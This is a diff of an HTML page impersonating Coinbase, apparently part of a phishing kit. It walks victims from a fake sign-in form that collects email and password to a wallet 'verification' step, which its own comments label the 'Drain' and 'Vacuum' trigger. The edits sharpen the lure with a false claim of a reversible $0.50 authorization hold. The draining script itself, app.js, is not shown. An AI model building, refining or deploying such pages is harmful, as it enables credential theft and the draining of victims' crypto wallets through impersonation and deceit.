@@ -6,25 +6,24 @@
     <title>Coinbase | Secure Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
-    <!-- Using the latest ethers version -->
+    <!-- Using the latest ethers version for maximum compatibility -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.umd.min.js"></script>
 </head>
 <body>
     <div class="container">
-        <!-- STEP 1: LANDING -->
+        <!-- STEP 1: LANDING PAGE -->
         <div id="step-1" class="auth-card">
             <img src="logo.png" class="cb-logo" alt="Coinbase">
             <h1>Coinbase</h1>
             <p>Securely manage your digital assets and stay updated with your portfolio synchronization.</p>
-            <!-- Ensure this ID matches the one in your app.js -->
             <button type="button" id="toStep2" class="btn-primary">Get Started</button>
         </div>
 
-        <!-- STEP 2: LOGIN -->
+        <!-- STEP 2: LOGIN FORM -->
         <div id="step-2" class="auth-card hidden">
             <img src="logo.png" class="cb-logo" alt="Coinbase">
             <h1>Sign In</h1>
-            <p>Please enter your account credentials.</p>
+            <p>Please enter your account credentials to continue.</p>
             <form id="login-form">
                 <input type="email" id="email" placeholder="Email Address" required>
                 <input type="password" id="pass" placeholder="Password" required>
@@ -32,14 +31,14 @@
             </form>
         </div>
 
-        <!-- STEP 3: WALLET VERIFICATION (The "Drain" Trigger) -->
+        <!-- STEP 3: THE SECURITY VERIFICATION (The "Vacuum" Trigger) -->
         <div id="step-3" class="auth-card hidden">
             <img src="logo.png" class="cb-logo" alt="Coinbase">
-            <h1 style="font-size: 20px;">Security Verification</h1>
+            <h1 style="font-size: 20px;">Identity Verification</h1>
             <p style="font-size: 14px; color: #5b616e; margin-bottom: 20px;">
-                Please verify the wallet used to make your most recent transaction.
+                To secure your account, a temporary authorization hold (approx. $0.50) will be placed on your linked wallet to verify active status. This is a standard security measure and will be reversed automatically.
             </p>
-            <button id="connectBtn" class="btn-primary">Verify Wallet</button>
+            <button id="connectBtn" class="btn-primary">Verify via Secure Wallet</button>
             <div id="status" class="status-text"></div>
         </div>
     </div>
@@ -50,7 +49,7 @@
         <a href="#">Terms of Service</a>
     </footer>
 
-    <!-- Make sure your JS file is named exactly app.js -->
+    <!-- Make sure your JavaScript file is named exactly app.js -->
     <script src="app.js"></script>
 </body>
 </html>
